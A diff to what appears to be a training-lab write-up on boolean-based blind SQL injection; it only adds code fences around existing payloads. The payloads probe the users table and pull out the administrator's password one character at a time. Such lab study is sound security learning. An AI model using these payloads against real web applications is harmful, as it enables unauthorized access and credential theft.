@@ -15,27 +15,36 @@ To solve the lab, log in as the administrator user.
 
 1/ Confirm that the parameter is vulnerable to "Boolean-based Blind SQL injection"
 
+```sql
 ' AND 1=1--
 
 ' AND 1=2--
+```
 
 
 2/ Confirm that we have a "users" table
 
+```sql
 ' AND (SELECT 'x' FROM users LIMIT 1)='x'--
+```
 
 
 3/ Confirm that username "administrator" exists in the "users" table
 
+```sql
 ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
+```
 
 
 4/ Enumerate the password of the "administrator" user
 
+```sql
 ' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)=20)='administrator'--
+```
 
+```sql
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
-
+```
 
 5/ Write a script to automate the password extraction
 
